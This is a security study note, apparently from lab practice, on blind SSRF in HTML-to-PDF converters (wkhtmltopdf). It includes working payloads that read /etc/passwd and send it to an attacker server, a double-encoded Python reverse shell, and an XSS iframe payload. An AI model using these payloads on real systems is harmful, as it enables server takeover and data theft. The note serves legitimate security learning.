Some websites, allows their users to generate a PDF based on the input they have provided.
## Data Exfiltration with Blind SSRF
In the following example scenario, a website accepts a `.html` input via file upload, which then converts the said HTML file into a PDF.

1. First let's confirm that a SSRF vulnerability exists by creating an `index.html` file that we will use to house our payload and upload it into the web application.
```html
<!DOCTYPE html>
<html>
	<body>
		<h1>Hello, World!</h1>
		<img src="http://<OUR IP>:PORT/x?=viaimgtag"/>
	</body>
</html>
```
2. For simplicity, we will use a Netcat listener to test for Blind SSRF.
```bash
nc -nvlp 4444
```
3. After awhile, we will see a response to our Netcat listener.
```bash
connect to [10.10.14.253] from (UNKNOWN) [10.129.155.177] 37124
GET /?x=testing HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
Accept: */*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.14.253:4444
```
By inspecting the request, we notice `wkhtmltopdf` in the User-Agent. If we browse [wkhtmltopdf's downloads webpage](https://wkhtmltopdf.org/downloads.html), the below statement catches our attention:

`Do not use wkhtmltopdf with any untrusted HTML – be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.`

This means we can execute JavaScript, this widens our attack surface and gives us more opportunity to escalate the attack.
### Read Local File or Gain RCE using JavaScript Payload
We will now modify our `index.html` file to use JavaScript and read a local file inside the web server to exfiltrate data. We can use the following payload for this task:
```html
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>
```

Additionally, we can also use this technique to gain remote code execution (RCE) into the web server using the following payload:
```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.253%2522%253Bexport%2520RPORT%253D4444%253Bpython3%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```
> Note: The payload is URL encoded twice. Utilise [revshells.com](https://revshells.com) for different shell payloads.
## SSRF Chain with XSS
If these inputs are non-sanitized, this can lead to a SSRF by chaining it with a [Cross Site Scripting](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FClient-side%20Vulnerabilities%2FCross-Site%20Scripting%2FIntroduction) (XSS) attack.

Usual pre-requisite for an attack like this is for the website to be vulnerable from Cross Site Scripting (XSS). For example, a target website generates an invoice that includes your full name in it. You can use the following payload as your full name: `<iframe src="http://attacker-website.com" width="400" height="400">` which then a PDF generator library would take and generate a PDF and executing the `iframe` code an attacker has provided.
